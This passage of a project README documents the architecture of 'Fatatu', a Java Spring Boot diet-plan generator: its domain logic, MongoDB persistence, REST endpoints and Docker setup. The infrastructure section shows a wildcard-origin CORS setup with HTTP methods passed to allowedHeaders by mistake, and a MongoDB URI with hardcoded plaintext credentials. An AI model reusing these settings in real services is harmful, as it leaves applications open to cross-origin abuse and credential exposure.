[//]: # (![DietGeneratorImpl addDishes Code screenshot]&#40;/screenshots/adddishesmethod_code_ss.png&#41;)

The diet plan is populated with specific meal types based on the requested number of meals:

- First Meal: Always Breakfast
- Last Meal: Always Dinner
- Fourth Meal (if applicable): Snack
- Middle Meals: Lunch-type meals

Random `Recipe` is picked from the list of given `MealType` to create a `Dish` and then added to the `Diet` object.
The `Dish` is created
using
static factory method. The nutrients information and required products in grams are calculated from given `Recipe`
and `baseCaloriesPerMeal`.
As `Recipe` holds `Nutrients` information per 100g of the products, `totalCalories` are divided by `baseCaloriesPerMeal`
to create the factor.
This factor is multiplied by each product proportion value to get the actual required grams of the product.

```java
    public static Dish createDish(Recipe recipe, BigDecimal requiredCalories) {
    BigDecimal recipeTotalCalories = recipe.getNutrients().getCalories().getTotalCalories();
    BigDecimal factor = requiredCalories.divide(recipeTotalCalories, 3, RoundingMode.HALF_UP);
    Map<Product, BigDecimal> emptyRecipeToGram = new HashMap<>();
    recipe.getIngredientsProportion().forEach(((product, proportion) -> {
        emptyRecipeToGram.put(product, proportion.multiply(factor));
    }));
    return new Dish(emptyRecipeToGram, recipe);
}
```

[//]: # (![Dish createDish Code screenshot]&#40;/screenshots/dishcreate_code_ss.png&#41;)

It is important to note that immediately after a `Dish` is added to the `Diet`, the macronutrients in
the `Macronutrient`
object are reduced by the total `Nutrients` value of the generated `Dish`. Once all requested dishes are added to
the `Diet`,
the `Macronutrient` object retains its `calories` field as 10% of the total requested calories, which is our reserved
calories value. The remaining fields — `proteins`, `fats`, and `carbohydrates` — are incorrect.

`Recipe` objects have strictly defined percentage ratios of `Product`, making it impossible to create a perfectly
macronutrient-balanced diet plan with randomly chosen recipes. While we can control the calories, the
specific macronutrient values must be adjusted accordingly.

The `adjustMacronutrients` method:

```java
   private void adjustMacronutrients(Diet diet) {
    int numberOfLoops = 3;
    for (int i = 0; i < numberOfLoops; i++) {
        if (missingMacronutrients.getCarbohydrates().doubleValue() < 0)
            diet.reduceMacronutrient(Filler.CARBOHYDRATE, missingMacronutrients.getCarbohydrates().abs(), missingMacronutrients);
        else
            diet.increaseMacronutrient(Filler.CARBOHYDRATE, missingMacronutrients.getCarbohydrates(), missingMacronutrients);

        if (missingMacronutrients.getFats().doubleValue() < 0)
            diet.reduceMacronutrient(Filler.FAT, missingMacronutrients.getFats().abs(), missingMacronutrients);
        else
            diet.increaseMacronutrient(Filler.FAT, missingMacronutrients.getFats(), missingMacronutrients);

        if (missingMacronutrients.getProteins().doubleValue() < 0)
            diet.reduceMacronutrient(Filler.PROTEIN, missingMacronutrients.getProteins().abs(), missingMacronutrients);
        else
            diet.increaseMacronutrient(Filler.PROTEIN, missingMacronutrients.getProteins(), missingMacronutrients);
    }
}
```

[//]: # (![DietGenerator adjustMacronutrient Code screenshot]&#40;/screenshots/adjustmacronutrient_code_ss.png&#41;)

This method check `Macronutrient`'s `carbohydrates`, `fats` and `proteins` fields. If the value is negative it means
there
is too much of the given macronutrient in the diet, if the value is positive it means there are missing macronutrient in
the diet and respectively `reduceMacronutrient` and `increaseMacronutrient` method are called on `Diet` object using
those offsets. Target
is to bring those values as close to 0 as possible.

As you can see on the screen, this operation is performed 3 times. It has to be done to generate diet accurately.
Each of missing macronutrients is adjusted separately, once we set our carbohydrates then during fats adjustment we may
break carbohydrates amount in the diet. Let's assume that we want to add 20g proteins to the diet, algorithm look for
all `Product` marked with `Filler.PROTEIN` and add calculated amount of those products to satisfy missing 20g of
proteins. Unfortunately, very likely this method is going to add also some carbohydrates and fats with those products.

Every iteration required macronutrients that need to be adjusted are closer to the 0 and three iterations is sufficient.

```java
    public void reduceValues(Nutrients nutrients) {
    setCalories(calories.subtract(nutrients.getCalories().getTotalCalories()));
    setProteins(proteins.subtract(nutrients.getProteins().getTotalProteins()));
    setFats(fats.subtract(nutrients.getFats().getTotalFats()));
    setCarbohydrates(carbohydrates.subtract(nutrients.getCarbohydrates().getTotalCarbohydrates()));
}

public void increaseValues(Nutrients nutrients) {
    setCalories(calories.add(nutrients.getCalories().getTotalCalories()));
    setProteins(proteins.add(nutrients.getProteins().getTotalProteins()));
    setFats(fats.add(nutrients.getFats().getTotalFats()));
    setCarbohydrates(carbohydrates.add(nutrients.getCarbohydrates().getTotalCarbohydrates()));
}
```

[//]: # (![Diet increase macro Code screenshot]&#40;/screenshots/increasemacro_code_ss.png&#41;)

Those method first look for `Dish` in the `Diet` object that can be scaled with the given `Filler`. Then the amount of
requested grams are distributed uniformly across the all suitable dishes and `Product`s in those `Dish`es by
calling `increaseFiller` or `reduceFiller`
methods.

Mentioned methods perform similar operation, but they iterate over `Product` list in the `Dish` and also updates
its own `Nutrients` to correct the changes.
The difference in `Nutrients` is returned and subtracted or added from `Macronutrient` object.

The `increaseFiller` method:

```java
public Nutrients increaseFiller(Filler filler, BigDecimal grams) {
    Nutrients totalAddedNutrients = Nutrients.createEmptyNutrients();
    if (grams == null || filler == null || filler == Filler.NONE || grams.doubleValue() <= 0) {
        return totalAddedNutrients;
    }

    Integer fillerPopulation = numberOfFillers.get(filler);
    if (fillerPopulation == null) return totalAddedNutrients;

    BigDecimal numberOfProductFillers = BigDecimal.valueOf(fillerPopulation);
    if (recipe.isScalable() && numberOfProductFillers.doubleValue() > 0) {
        BigDecimal gramsFraction = grams.divide(numberOfProductFillers, 2, RoundingMode.HALF_DOWN);
        productToGrams.forEach(((product, bigDecimal) -> {
            if (product.getFiller().equals(filler)) {
                BigDecimal currentGrams = productToGrams.get(product);
                BigDecimal productGramsToAdd = product.calculateProductGramsForRequiredFiller(filler, gramsFraction);
                productToGrams.put(product, currentGrams.add(productGramsToAdd));
                Nutrients subtractedNutrients = product.calculateNutrients(productGramsToAdd);
                nutrients.addNutrients(subtractedNutrients);
                totalAddedNutrients.addNutrients(subtractedNutrients);
            }
        }));
    }
    return totalAddedNutrients;
}
```

[//]: # (![Dish increaseFiller Code screenshot]&#40;/screenshots/increasefiller_code_ss.png&#41;)

The `reduceFiller` method:

```java
public Nutrients reduceFiller(Filler filler, BigDecimal grams) {
    Nutrients totalReducedNutrients = Nutrients.createEmptyNutrients();
    if (grams == null || filler == null || grams.doubleValue() <= 0 || filler == Filler.NONE) {
        return totalReducedNutrients;
    }

    Integer fillerPopulation = numberOfFillers.get(filler);
    if (fillerPopulation == null) return totalReducedNutrients;

    BigDecimal numberOfProductFillers = BigDecimal.valueOf(fillerPopulation);
    if (recipe.isScalable() && numberOfProductFillers.doubleValue() > 0) {
        BigDecimal gramsFraction = grams.divide(numberOfProductFillers, 2, RoundingMode.HALF_DOWN);

        Map<Product, BigDecimal> fillersToGrams = productToGrams.entrySet().stream()
                .filter(entry -> entry.getKey().getFiller().equals(filler))
                .collect(Collectors.toMap(
                        Map.Entry::getKey,
                        Map.Entry::getValue));

        fillersToGrams.forEach(((product, currentGrams) -> {
            BigDecimal productGramsToRemove = product.calculateProductGramsForRequiredFiller(filler, gramsFraction);
            if (currentGrams.subtract(productGramsToRemove).doubleValue() > 0) {
                productToGrams.put(product, currentGrams.subtract(productGramsToRemove));
                Nutrients subtractedNutrients = product.calculateNutrients(productGramsToRemove);
                nutrients.subtractNutrients(subtractedNutrients);
                totalReducedNutrients.addNutrients(subtractedNutrients);
            }
        }));
    }
    return totalReducedNutrients;
}
```

[//]: # (![Dish reduceFiller Code screenshot]&#40;/screenshots/reducefiller_code_ss.png&#41;)

### 3.4.2 ShoppingListGenerator

The `ShoppingListGenerator` is a simple interface with one default method that generates a `Map<String, Double>` of
product names to values
in grams for the entire diet. It requires only one parameter, which is `Diet`.

```java
public interface ShoppingListGenerator {

    static Map<String, Double> generateShoppingList(Diet diet) {
        Map<String, Double> shoppingList = new HashMap<>();

        diet.getDishes().forEach((dish -> {
            dish.getProductToGrams().forEach((product, grams) -> {
                Double currentValue = shoppingList.get(product.getName());
                double valueToAdd = grams.setScale(1, RoundingMode.HALF_UP).doubleValue();
                if (currentValue != null) {
                    valueToAdd += currentValue;
                }
                shoppingList.put(product.getName(), valueToAdd);
            });
        }));
        return shoppingList;
    }
}
```

[//]: # (![ShoppingListGenerator Code screenshot]&#40;/screenshots/shoppinglistgenerator_code_ss.png&#41;)

# 4. Application

The application layer contains actual business logic and usage of domain layer. It orchestrates use cases, and indicate
interfaces that need to be implemented to provide correct functionality of the application. It is important to note
here, that
this layer, same as domain layer, is free from frameworks and libraries.

## 4.1 Repositories

The application require access to database to obtain information about recipes and products. Those database usage is
dictated by interfaces exposed in this layer. As application layer is not depended on actual infrastructure layer, it
doesn't care about what kind of database will provide that information. The only requirement is that those interfaces
need to be implemented correctly in infrastructure layer.

The `ProductRepository`:

```java
public interface ProductRepository {

    Product save(Product product);

    Product getProduct(String productName);

    Product getProduct(UUID uuid);

}
```

The `RecipeRepository` :

```java
public interface RecipeRepository {

    Recipe save(Recipe recipe);

    List<Recipe> findAllByDietAndMealTypes(DietType dietType, MealType mealType);

    List<Recipe> findByName(String name);

}
```

## 4.2 Use Cases

The use cases are actual usage of domain layer, should contain only one concrete business usage of application. From
code perspective, it has to have only one public method, but can have unlimited private methods.

To keep this layer free from framework and libraries, those use cases need to be registered in `BeanConfiguration` class
in infrastructure layer.
That allows them to be injected in presentation layer in controllers. See infrastructure layer documentation to discover
details.

The implementation of `CalculateBMIUseCase` and `CalculateTDEEUseCase` is quite simple and straightforward and consist
of actual calculator method call.

The `CalculateDietUseCase` is interesting use case. This class need to actually use the logic created in domain layer.
It is next layer of abstraction, none of low level implementation is presented here. Only actual usage.

```java

@Override
public Diet createDiet(DietAttributes dietAttributes) {

    Macronutrient macronutrient = calculateMacronutrients(dietAttributes);
    Map<MealType, List<Recipe>> allRecipes = getAllSegregatedRecipes(dietAttributes.dietType());

    DietGenerator dietGeneratorImpl = new DietGeneratorImpl(
            dietAttributes.numberOfMeals(),
            macronutrient,
            allRecipes);

    return dietGeneratorImpl.generateDiet();
}
```

First `Macronutrient` is calculated using private method where `MacroCalculator` is created
using `MacroCalculatorFactory`.

```java
private Macronutrient calculateMacronutrients(DietAttributes dietAttributes) {
    MacroCalculator macroCalculator = MacroCalculatorFactory.getMacroCalculator(dietAttributes.dietType());
    MacroCalculatorAttributes macroCalculatorAttributes = new MacroCalculatorAttributes(
            dietAttributes.requiredCalories(),
            dietAttributes.bodyWeightInKg(),
            dietAttributes.gender());
    return macroCalculator.calculate(macroCalculatorAttributes);
}
```

Next, the list of `Recipes` is fetched from the database and segregated by the `MealType` and stored in the `Map`.
Once all data is gathered to perform diet generation, the `DietGeneratorImpl` object is created and method generateDiet
is used to create `Diet`.
Rest logic happened in the generator class itself and ready object is returned to the presentation layer where is mapped
to the `Response` and returned to the user.

# 5. Infrastructure

---


In the infrastructure layer, we find all configurations, external API integrations, and persistence connections. This
application currently uses the Spring Boot 3 framework, so all configurations related to Spring will be kept in this
layer. In addition to the framework, the application utilizes a MongoDB database and the CalorieNinjas external API to
populate Products.

## 5.1 Spring Boot configuration

### 5.1.1 Bean Configuration

The application uses a clean architecture approach, meaning that the domain and application layers must be kept separate
from framework dependencies. As mentioned in the architecture documentation, there is a specific way to achieve this. We
need to register `UseCases` classes from the application layer with `@Bean` in the `@Configuration` layer. This allows
us to
inject these classes into other components within the application while keeping domain and application layers framework
free.

Since the application is relatively small, the configuration file is also small.

Here is a sample `@Bean` registration method:

```java

@Configuration
public class BeanConfiguration {

    @Bean
    public CreateDiet dietService(RecipeRepository recipeRepository) {
        return new CreateDietUseCase(recipeRepository);
    }
}
```

[//]: # (![Bean registration screenshot]&#40;/screenshots/bean_registration_ss.png&#41;)

### 5.1.2 Cors Configuration

Cross-Origin Resource Sharing (CORS) is a security feature implemented by web browsers that allows or restricts web
pages from making requests to a different domain than the one that served the web page. This is done to prevent
potentially malicious websites from accessing sensitive data on other sites without the user's knowledge.

To allows users utilize this application from the browser, cors configuration need to be implemented.
The application has presentation Single-Page Application and endpoints are exposed by Spring MVC, the basic config is
provided. It is highly
recommended to
adjust these settings for your needs.

```java

@Configuration
public class CorsConfiguration {

    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping(""/api/**"")
                        .allowedHeaders(""GET"", ""POST"")
                        .allowedOrigins(""*"")
                        .allowedHeaders(""*"");
            }
        };
    }

}
```

[//]: # (![CORS config screenshot]&#40;/screenshots/cors_config_ss.png&#41;)

### 5.1.3 Error Handling

When ever error is thrown in the application, we can catch it and return custom response to the user.
To achieve this, application utilize `@ControllerAdvice` component and register errors to be handled in this class. In
all cases `ExceptionResponse` dto is returned to the user with message, date and description. See presentation layer for
details about dto.

```java

@ControllerAdvice
public class GlobalExceptionHandler extends ResponseEntityExceptionHandler {

    @ExceptionHandler(ResourceNotFoundException.class)
    public ResponseEntity<ExceptionResponse> handleIllegalArgumentException(
            ResourceNotFoundException exception, WebRequest webRequest) {

        ExceptionResponse errorDto = new ExceptionResponse(
                exception.getMessage(),
                new Date(),
                webRequest.getDescription(false));

        return new ResponseEntity<>(errorDto, HttpStatus.NOT_FOUND);
    }
}
```

[//]: # (![GlobalExceptionHandler config screenshot]&#40;/screenshots/global_exception_handler_ss.png&#41;)

## 5.2 Calories Ninjas

This application leverages the CalorieNinjas external API to gather information about `Products`. CalorieNinjas offers a
straightforward registration process and user-friendly endpoints. The free tier allows for up to 10,000 requests per
month.

During application startup, the database is populated using data from CalorieNinjas. If a product is already present in
the database, the API call is skipped to optimize performance and reduce unnecessary requests.

The `Products` to fetch are indicated in the `recipe.txt` list in the resources' folder. The `RecipeInit` class is the
parser for that list, and it uses `NinjaService` where `NinjaApi` class is injected.
Special format need to be kept if you decide to extend that list.

![Recipe List screenshot](/screenshots/recipe_list_ss.png)

First line `*` indicate the beginning of the list, followed by properties always in the same order, each properties need
to contain `:` and no space:

- Name (name of your recipe)
- HowTo (preparation steps)
- DietType (High Protein (the only supported diet right now))
- MealType (it can be list, each element separated by `/` sign. See domain layer for available meals)
- Scalable (true or false)

After properties list of products need to appear each in separate line enclosed by `**` from top and bottom line.
The format is as follows:

`name:grams/Filler`

The `name` in this format will be requested by the api. For `Filler` see the domain layer documentation. The `grams`
properties need to be given as integer.

The last line `***` indicate end of the recipe to parse.

The `NinjaApi` will fetch data using `RestClient`, provided by the Spring dependency library, from the CaloriesNinja api
and generate `NinjaReponse` that holds the list of `NinjaItems`.
First `NinjaItem` found in `NinjaResponse` will be mapped to the `Product` and saved to the database
using `ProductService`.

## 5.3 Persistence

This application utilize MongoDB which is easy to use NoSQL database. As Clean Architecture is used in this project,
each `@Document` has special implementation flow. Database connection configuration is very simple, it consists of one
line located in
`application.properties` file and `MongoDBConfiguration` class where packages is specified to scan. 

``` application.properties
spring.data.mongodb.uri=mongodb://fatatu:fatatu@mongo:27017/diet-generator?authSource=admin
```

```java
@Configuration
@EnableMongoRepositories(basePackages = ""org.ectimel.dietgenerator.infrastructure.persistance.mongo.repositories"")
public class MongoDBConfiguration {
}
```


Note that Docker Compose is used in this project, which means the uri address is service name
from `docker-compose.yaml`.

### 5.3.1 Documents

Currently, application has 2 main documents `ProductDocument` and `RecipeDocument`. I decided to use `UUID` as id in
each
document in this application. To achieve that, special abstract class `MongoUUIDEntity` that holds id as `UUID` type was
created.
It also contains setter method that is used during serialization if id is not presented.

```java

@Getter
@SuperBuilder
@NoArgsConstructor
public abstract class MongoUUIDEntity {

    @Id
    protected UUID id;

    public void setId(UUID id) {
        if (this.id != null) throw new UnsupportedOperationException(""ID is already defined"");

        this.id = id;
    }
}
```

[//]: # (![MongoUUID screenshot]&#40;/screenshots/mogouuid_ss.png&#41;)

Each actual document need to extend that class to provide `UUID` as ID. Special `@Component` is created that listen
for `BeforeConvertEvent` and will assign the UUID.

```java

@Component
public class UuidEntityEventListener extends AbstractMongoEventListener<MongoUUIDEntity> {

    @Override
    public void onBeforeConvert(BeforeConvertEvent<MongoUUIDEntity> event) {
        super.onBeforeConvert(event);
        MongoUUIDEntity mongoUUIDEntity = event.getSource();

        if (mongoUUIDEntity.getId() == null) {
            mongoUUIDEntity.setId(UUID.randomUUID());
        }
    }

}
```

[//]: # (![Before Convert Event screenshot]&#40;/screenshots/beforeConvert_event_ss.png&#41;)

### 5.3.2 Mappers

Each document need to have its own mapper that will map `@Document` to domain object and from domain to `@Document`.
This step is mandatory to separate domain and infrastructure layers. `DomainMapper` generic interface is created to be
implemented by actual mappers. Some inner classes that are used to represent data but are not actual `@Documents` also
needs mappers. For example `NutrientInformation` class.

```java
public interface DomainMapper<D, E> {
    D mapToDomain(E entityObject);

    E mapFromDomain(D domainObject);
}
```

[//]: # (![Domain Mapper screenshot]&#40;/screenshots/domain_mapper_ss.png&#41;)

### 5.3.3 Repositories

As mentioned before, the domain layer expose interfaces that need to be implemented to provide reading from and writing
to database.
Those repositories classes are prefixed with `Mongo` and suffixed with `Impl` and those classes are injected into
the `UseCases` that are registered by `BeanConfiguration` class.

To utilize SpringJDBC we need to perform additional step. For each `@Document` we need to create the interface that will
extend
`MongoRepository<T, ID>` interface. This repository extend `CrudRepository` and is adjusted to handle custom
mongo `@Query`. Those interfaces always have prefix `SpringDataMongo`

```java
public interface SpringDataMongoProductRepository extends MongoRepository<ProductDocument, UUID> {

    @Query(""{ 'name' : ?0 }"")
    Optional<ProductDocument> findByName(String name);

}
```

[//]: # (![Spring Data Repo screenshot]&#40;/screenshots/spring_data_repo_ss.png&#41;)

Once we have our interfaces we inject them in to the classes that implement exposed by domain layer interfaces to
actually perform writing to and reading from database.

```java

@Repository
@Qualifier(""mongoProductRepository"")
public class MongoProductRepositoryImpl implements ProductRepository {

    private final SpringDataMongoProductRepository productRepository;
    private final ProductMapper productMapper;

    public MongoProductRepositoryImpl(SpringDataMongoProductRepository productRepository, ProductMapper productMapper) {
        this.productRepository = productRepository;
        this.productMapper = productMapper;
    }

    @Override
    public Product save(Product product) {
        ProductDocument savedProduct = productRepository.save(productMapper.mapFromDomain(product));
        return productMapper.mapToDomain(savedProduct);
    }
}
```

[//]: # (![Mongo Impl Repo screenshot]&#40;/screenshots/mongo_impl_ss.png&#41;)

This way we keep our domain layer free from frameworks. To look at it from another angle see the diagram below.

![Repositories UML screenshot](/screenshots/repositories_uml.png)

# 6. Presentation

---

The presentation layer is responsible for handling user interface logic. It interacts with the user, displaying data and
capturing user input, and then communicates this data to the underlying application layers without containing any
business logic itself.

Currently, the application expose rest controllers to the user that can be used to perform some operations. Those
controllers are:
`CalculatorController`, `DietController`, `ProductController`, `RecipeController`. All controllers paths are prefixed
with
`/api/v1/` to indicate usage of api and the version.

For details please visit the [SWAGGER](link) documentation.

Each endpoint has its own response object, suffixed with `Response`. If endpoint is of type `POST` and
require `@RequestBody` object, it has dto object suffixed with `Request`. Every other dto object (inner objects) are
suffixed with `Dto`.

DTOs objects are used to transfer data to the user, we would like to avoid responds with domain objects. To achieve
these,
mappers classes ware created. Some, complex `Request` objects has built method mapToDomain() to simplify complexity.

```java
public DietAttributes mapToDomain() {
    return new DietAttributes(
            BigDecimal.valueOf(this.kcal()),
            DietType.fromValue(this.dietType()),
            BigDecimal.valueOf(this.numberOfMeals()),
            BigDecimal.valueOf(this.bodyWeightInKg()),
            Gender.stringToGender(this.gender()));
}
```

## 6.1 Controllers endpoints:

Most important is `DietController`, it expose one endpoint for diet generation:

`/api/v1/` with `POST` method.

```java

@PostMapping
public ResponseEntity<DietResponse> generateDiet(@Valid @RequestBody DietRequest dietRequest) {
    Diet diet = createDiet.createDiet(dietRequest.mapToDomain());
    return ResponseEntity.ok(dietMapper.mapToDietResponse(diet));
}
```

This endpoint require validated `DietRequest` dto and simple implementation in json format is presented below.

```json
{
  ""kcal"": ""3000"",
  ""dietType"": ""High Protein"",
  ""numberOfMeals"": ""5"",
  ""bodyWeightInKg"": 100,
  ""gender"": ""MALE""
}
```

It returns `DietResponse` object:

```java
public record DietResponse(List<DishDto> dishes, NutrientDto nutrition, Map<String, Double> shoppingList) {
}
```

The `CalculatorController` provide 2 endpoints.

`/api/v1/tdee` with `POST` method

```java

@PostMapping(""/tdee"")
public ResponseEntity<TDEEResponse> calculateTDEE(@RequestBody TDEERequest TDEERequest) {
    Double TDEE = TDEECalculator.calculateTDEE(TDEERequest.mapToDomain()).doubleValue();
    return ResponseEntity.ok(new TDEEResponse(TDEE + ""kcal""));
}
```

This endpoint require validated `TDEERequest` dto and simple implementation in json format is presented below.

```json
{
  ""bodyWeightInKg"": 120,
  ""heightInCm"": 174,
  ""age"": 30,
  ""gender"": ""maasdlae"",
  ""activityLevel"": ""MODERATELY""
}
```

`/api/v1/bmi` with `POST` method

```java

@PostMapping(""/bmi"")
public ResponseEntity<BMIResponse> calculateBMI(@RequestBody BMIRequest BMIRequest) {
    Double result = calculateBMI.calculate(
                    BigDecimal.valueOf(BMIRequest.bodyWeightInKg()),
                    BigDecimal.valueOf(BMIRequest.heightInCm()))
            .doubleValue();

    return ResponseEntity.ok(new BMIResponse(result));
}
```

This endpoint require validated `BMIRequest` dto and simple implementation in json format is presented below.

```json
{
  ""bodyWeightInKg"": 120,
  ""heightInCm"": 174
}
```

The `RecipeController` expose endpoint to fetch information about recipes.

`/api/v1/{recipeName}` with `GET` method and require path variable.

```java

@GetMapping(""/{recipeName}"")
public ResponseEntity<RecipeResponse> getProductByName(@PathVariable String recipeName) {
    List<Recipe> recipeList = recipeService.getRecipe(recipeName);
    List<RecipeDto> recipeDto = recipeList
            .stream()
            .map(recipeDtoMapper::mapFromDomain)
            .toList();
    return ResponseEntity.ok(new RecipeResponse(recipeDto));
}
```

The `ProductController` expose endpoint to fetch information about products.

`/api/v1/{productName}` with `GET` method and require path variable.

```java

@GetMapping(""/{productName}"")
public ResponseEntity<ProductResponse> getProductByName(@PathVariable String productName) {
    Product product = productService.getProduct(productName);
    ProductDto productDto = productDtoMapper.mapFromDomain(product);
    return ResponseEntity.ok(new ProductResponse(List.of(productDto)));
}
```

# 7. Docker

---

The application uses Docker and Docker Compose to simplyfy deployment and configuration on other machines.
The `docker-compose.yaml` consist of 4 services - mongo, mongo-express, spring-boot-app, and react-vite.
First two are database related services where mongo-express allows us to explore database using graphical user
interface.

Dockerfile for react application:

```dockerfile
FROM node:18.20.2-alpine

WORKDIR /app

COPY package.json .

RUN npm install -g npm@10.5.1
RUN npm install -g typescript
RUN npm install

COPY . .

RUN npm run build

EXPOSE 5173

CMD [ ""npm"", ""run"", ""preview"" ]
```

Dockerfile for Spring Boot app, note that it use multistage approach. First jar file is built, and secondly application
is started from that jar file.

```dockerfile
FROM maven:3.9 as BUILD
WORKDIR /app
COPY pom.xml /app
RUN mvn dependency:resolve
COPY . /app
RUN mvn clean
RUN mvn package -DskipTests -X

FROM amazoncorretto:21
COPY --from=BUILD /app/target/*.jar app.jar
EXPOSE 8080
CMD [""java"", ""-jar"", ""app.jar""]
```

# 8. Inspirations

1. https://github.com/kgrzybek/modular-monolith-with-ddd
2. Clean Architecture
3. Fitatu - https://www.fitatu.com/

# THE END! 






",0,0,4,mit,17.0,"['fatatu', 'diet', 'generator', 'technology', 'stack', 'backend', 'frontend', 'live', 'application', 'http', 'application', 'deployed', 'welcome', 'play', 'relative', 'simple', 'satisfying', 'use', 'run', 'local', 'machine', 'make', 'sure', 'docker', 'docker', 'compose', 'installed', 'install', 'docker', 'link', 'install', 'docker', 'compose', 'link', 'obtain', 'calorieninjas', 'api', 'key', 'use', 'application', 'need', 'api', 'key', 'calorieninjas', 'registration', 'straight', 'forward', 'easy', 'quick', 'free', 'tier', 'allows', 'perform', 'request', 'per', 'month', 'definitely', 'sufficient', 'registration', 'link', 'logged', 'go', 'myaccount', 'section', 'click', 'link', 'copy', 'api', 'key', 'clicking', 'api', 'key', 'install', 'git', 'git', 'installed', 'yet', 'machine', 'follow', 'instruction', 'link', 'clone', 'github', 'repository', 'command', 'line', 'navigate', 'folder', 'choose', 'move', 'cloned', 'repository', 'set', 'environment', 'variable', 'create', 'file', 'root', 'folder', 'open', 'using', 'text', 'editor', 'add', 'line', 'replace', 'key', 'calorieninjas', 'start', 'docker', 'compose', 'start', 'docker', 'compose', 'make', 'sure', 'docker', 'running', 'may', 'take', 'several', 'minute', 'download', 'dependency', 'patient', 'enjoy', 'application', 'docker', 'container', 'running', 'access', 'presentation', 'website', 'link', 'enter', 'directly', 'browser', 'api', 'base', 'url', 'follow', 'see', 'presentation', 'layer', 'documentation', 'discover', 'available', 'endpoint', 'visit', 'swagger', 'commits', 'application', 'developed', 'competitive', 'event', 'commits', 'organized', 'devmentors', 'primary', 'objective', 'competition', 'create', 'original', 'open', 'source', 'project', 'course', 'day', 'rule', 'simple', 'participant', 'must', 'make', 'least', 'one', 'commit', 'main', 'branch', 'registered', 'repository', 'every', 'day', 'flexibility', 'participant', 'take', 'one', 'day', 'without', 'commit', 'referred', 'joker', 'day', 'grand', 'prize', 'winner', 'macbook', 'pro', 'information', 'visit', 'official', 'website', 'link', 'checkout', 'devmentors', 'youtube', 'pl', 'eng', 'documentation', 'introduction', 'importance', 'documentation', 'fatatu', 'repository', 'exist', 'disclaimer', 'star', 'share', 'architecture', 'clean', 'architecture', 'model', 'system', 'context', 'container', 'component', 'code', 'calculator', 'component', 'diet', 'component', 'ninja', 'service', 'component', 'domain', 'human', 'body', 'work', 'kcal', 'work', 'bmi', 'tdee', 'tef', 'data', 'representation', 'product', 'filler', 'nutrient', 'recipe', 'mealtype', 'diettype', 'bigdecimal', 'dish', 'diet', 'calculator', 'bmicalculator', 'bmrcalculator', 'macrocalculator', 'generator', 'dietgenerator', 'shoppinglistgenerator', 'application', 'repositories', 'use', 'case', 'infrastructure', 'spring', 'boot', 'configuration', 'bean', 'configuration', 'cors', 'configuration', 'error', 'handling', 'calorie', 'ninja', 'persistence', 'document', 'mapper', 'repositories', 'presentation', 'controller', 'endpoint', 'docker', 'inspiration', 'introduction', 'importance', 'documentation', 'wherever', 'go', 'constantly', 'hear', 'importance', 'documentation', 'software', 'development', 'many', 'time', 'tried', 'use', 'library', 'find', 'lack', 'proper', 'documentation', 'made', 'incredibly', 'difficult', 'understand', 'implement', 'experience', 'underscore', 'critical', 'point', 'software', 'developer', 'want', 'build', 'software', 'effectively', 'team', 'must', 'pay', 'close', 'attention', 'explain', 'thought', 'code', 'good', 'documentation', 'essential', 'collaboration', 'maintenance', 'onboarding', 'new', 'team', 'member', 'bridge', 'gap', 'developer', 'intention', 'user', 'understanding', 'ensuring', 'work', 'accessible', 'usable', 'others', 'without', 'even', 'elegant', 'code', 'become', 'impenetrable', 'black', 'box', 'hindering', 'productivity', 'innovation', 'fatatu', 'fatatu', 'diet', 'generator', 'application', 'generate', 'list', 'meal', 'ingredient', 'nutrition', 'information', 'based', 'provided', 'criterion', 'required', 'kcal', 'diet', 'target', 'diet', 'type', 'etc', 'addition', 'diet', 'provide', 'shopping', 'list', 'one', 'click', 'get', 'diet', 'go', 'straight', 'shop', 'buy', 'need', 'need', 'waste', 'time', 'browsing', 'recipe', 'adjusting', 'macro', 'application', 'repository', 'exists', 'first', 'reason', 'application', 'created', 'idea', 'mind', 'couple', 'finally', 'decided', 'create', 'second', 'reason', 'competitive', 'event', 'gave', 'motivation', 'begin', 'project', 'push', 'skill', 'next', 'level', 'third', 'reason', 'found', 'creating', 'application', 'beginning', 'end', 'including', 'deployment', 'extremely', 'beneficial', 'improving', 'skill', 'software', 'developer', 'repository', 'decided', 'learn', 'mongodb', 'apply', 'clean', 'architecture', 'implement', 'comprehensive', 'documentation', 'disclaimer', 'beginner', 'software', 'developer', 'less', 'year', 'experience', 'hobby', 'never', 'work', 'professional', 'environment', 'learn', 'everything', 'book', 'online', 'course', 'documentation', 'blog', 'forum', 'youtube', 'ai', 'forgive', 'something', 'okay', 'repo', 'star', 'share', 'like', 'work', 'appreciate', 'star', 'perhaps', 'share', 'application', 'friend', 'happy', 'coding', 'architecture', 'application', 'simple', 'monolith', 'utilize', 'clean', 'architecture', 'approach', 'clean', 'architecture', 'clean', 'architecture', 'introduced', 'robert', 'c', 'martin', 'offer', 'numerous', 'benefit', 'backend', 'application', 'enforces', 'clear', 'separation', 'concern', 'enhancing', 'code', 'manageability', 'comprehension', 'structure', 'improves', 'testability', 'decoupling', 'business', 'logic', 'external', 'dependency', 'leading', 'robust', 'code', 'modularity', 'clean', 'architecture', 'increase', 'flexibility', 'maintainability', 'allowing', 'change', 'one', 'part', 'application', 'without', 'impacting', 'others', 'also', 'promotes', 'independence', 'specific', 'framework', 'sure', 'concise', 'overview', 'layer', 'clean', 'architecture', 'presentation', 'layer', 'responsibility', 'manages', 'user', 'interaction', 'component', 'uis', 'view', 'controller', 'function', 'interprets', 'user', 'input', 'display', 'data', 'dependency', 'depends', 'application', 'layer', 'domain', 'layer', 'responsibility', 'core', 'business', 'logic', 'rule', 'component', 'entity', 'value', 'object', 'domain', 'service', 'function', 'defines', 'business', 'concept', 'rule', 'dependency', 'independent', 'dependency', 'application', 'layer', 'responsibility', 'orchestrates', 'business', 'operation', 'component', 'use', 'case', 'application', 'service', 'function', 'executes', 'operation', 'coordinate', 'data', 'flow', 'dependency', 'depends', 'domain', 'layer', 'infrastructure', 'layer', 'responsibility', 'provides', 'technical', 'implementation', 'component', 'database', 'external', 'apis', 'framework', 'function', 'handle', 'technical', 'detail', 'concrete', 'implementation', 'dependency', 'depends', 'layer', 'diagram', 'clearly', 'see', 'domain', 'layer', 'know', 'anything', 'application', 'layer', 'applies', 'application', 'layer', 'knowledge', 'domain', 'know', 'anything', 'infrastructure', 'presentation', 'layer', 'another', 'popular', 'diagram', 'describe', 'clean', 'architecture', 'apart', 'separation', 'concern', 'another', 'main', 'goal', 'keep', 'domain', 'application', 'layer', 'completely', 'clear', 'framework', 'library', 'nearly', 'archived', 